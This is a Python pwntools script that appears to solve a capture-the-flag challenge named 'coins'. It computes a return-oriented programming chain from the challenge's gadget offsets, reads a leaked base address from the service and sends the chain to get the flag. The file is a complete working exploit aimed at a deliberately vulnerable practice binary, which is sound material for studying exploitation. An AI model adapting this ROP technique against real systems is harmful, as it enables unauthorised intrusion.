#!/usr/bin/env python3
# coins -- a ROP challenge where every qword of the chain must be the address
# of one of the "coin" gadgets ("pay in my kind of money"), and the last one
# must be `shilling`. The validator (cg) walks the buffer 8 bytes at a time;
# when it reaches the end, `cd` checks the final qword is shilling, does `stc`,
# and falls into `glhf: ret` -- with rsp still on our buffer, so the buffer
# itself is the chain.
#
# The only way out is:  quarter (rax = base+0x1a26) ; cent (rax += r8) ; shilling (jmp rax)
# so we must build r8 = flag_price_offset - 0x1a26 out of adc/sub coin gadgets.
# All of r8..r15 start at 0 (r11 = input length) and stc means the *first*
# gadget's adc carries in an extra 1.
import re, sys
from pwn import *

context.log_level = 'warn'

G = {  # name -> file offset
 'croeseid':0x142e,'daric':0x1433,'siglos':0x1438,'karshapana':0x143d,
 'tetradrachm':0x1442,'stater':0x1447,'obol':0x144c,'lepton':0x1451,
 'aureus':0x1459,'solidus':0x1461,'denarius':0x1469,'antoninianus':0x1471,
 'sestertius':0x1479,'florin':0x1481,'sequin':0x1489,'tremissis':0x1491,
 'dinar':0x1499,'dirham':0x14a1,'scudo':0x14a9,'thaler':0x14b1,
 'real':0x14b9,'piloncitos':0x14c1,'koban':0x14c9,
 'loonie':0x14d1,'krugerrand':0x14d5,'sovereign':0x14d9,'drachma':0x14dd,
 'penny':0x14e1,'nickel':0x14e5,'dime':0x14e9,
 'quarter':0x14ed,'cent':0x14f5,'shilling':0x14f9,
}
R8 = [('croeseid',1),('aureus',0x100),('dinar',0x10000),
      ('dirham',0x20000),('scudo',0x40000),('thaler',0x80000)]
# r11 is skipped: it starts at the input length rather than 0.
OTH = [('piloncitos','r10',0x40000),('real','r9',0x20000),
       ('tremissis','r15',0x8000),('sequin','r14',0x4000),('florin','r13',0x2000),
       ('sestertius','r12',0x1000),('denarius','r10',0x400),('solidus','r9',0x200),
       ('lepton','r15',0x80),('obol','r14',0x40),('stater','r13',0x20),
       ('tetradrachm','r12',0x10),('siglos','r10',4),('daric','r9',2)]
SUB = {'r9':'loonie','r10':'krugerrand','r12':'drachma','r13':'penny','r14':'nickel','r15':'dime'}

def decompose(S):
    out = []
    for name, reg, v in OTH:
        while S >= v:
            S -= v; out.append((name, reg))
    return (out, S)

def solve(T, budget=28):
    best = None
    for a in range(0, 8):
      for b in range(0, 8):
        for c in range(0, 4):
          for d in range(0, 4):
            for e in range(0, 4):
              for f in range(0, 4):
                A = a + b*0x100 + c*0x10000 + d*0x20000 + e*0x40000 + f*0x80000 + 1
                S = A - T
                if S < 0 or S & 1: continue
                parts, rem = decompose(S)
                if rem: continue
                regs = sorted({r for _, r in parts})
                n = a+b+c+d+e+f + len(parts) + len(regs)
                if n <= budget and (best is None or n < best[0]):
                    best = (n, a,b,c,d,e,f, parts, regs)
    return best

def build(base, T):
    r = solve(T)
    if not r: return None
    _, a,b,c,d,e,f, parts, regs = r
    names  = ['croeseid']*a + ['aureus']*b + ['dinar']*c + ['dirham']*d + ['scudo']*e + ['thaler']*f
    names += [n for n, _ in parts] + [SUB[x] for x in regs]
    names += ['quarter', 'cent', 'shilling']
    return b''.join(p64(base + G[n]) for n in names), names

io = (remote(*(lambda h, p: (h, int(p)))(*sys.argv[1].rsplit(':', 1)), ssl=True, timeout=15)
      if len(sys.argv) > 1 and ':' in sys.argv[1] else process('./pwn_coins/coins'))
hdr = io.recvuntil(b'> ', timeout=15).decode(errors='replace')
base   = int(re.search(r'starting balance:\s*0x([0-9a-f]+)', hdr).group(1), 16)
offset = int(re.search(r'\+ 0x([0-9a-f]+)', hdr).group(1), 16)
T = offset - 0x1a26
chain, names = build(base, T)
log.warn(f"base={base:#x} price=+{offset:#x} r8 target={T:#x} chain={len(chain)//8} qwords")
assert 8 <= len(chain) <= 0xf8
io.send(chain)
print(io.recvall(timeout=8).decode(errors='replace').strip())
